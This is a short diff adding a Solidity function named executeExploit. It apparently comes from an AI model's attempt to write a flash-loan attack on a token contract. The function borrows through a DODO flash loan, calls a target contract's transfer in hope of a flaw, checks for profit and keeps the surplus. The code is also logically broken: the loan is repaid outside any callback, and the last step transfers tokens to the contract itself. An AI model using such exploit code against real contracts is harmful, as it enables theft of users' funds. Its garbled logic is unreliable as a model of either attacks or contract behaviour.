@@ -1,0 +1,29 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Fetch WBNB balance
+    uint256 initialWBNBBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    
+    // Step 2: Use flashloan to receive valuableToken
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0");
+
+    // Step 3: Approve target contract to swap tokens
+    valuableToken.approve(target, amount);
+
+    // Step 4: Perform an action that I suspect has the flaw
+    IElo(target).transfer(address(this), amount);
+    
+    // Step 5: Ensure I receive more valuableToken than I spent
+    uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
+    require(finalValuableBalance > amount, "No profit was made");
+    
+    // Step 6: Prepare to pay back the flashloan
+    valuableToken.transfer(flashloanProvider, amount);
+    
+    // Step 7: If any excess tokens were accrued, transfer them to the test contract
+    uint256 surplusInValuable = valuableToken.balanceOf(address(this));
+    require(surplusInValuable > 0, "No surplus tokens to profit from");
+    valuableToken.transfer(address(this), surplusInValuable);
+}
+</executeExploitCode>
+```
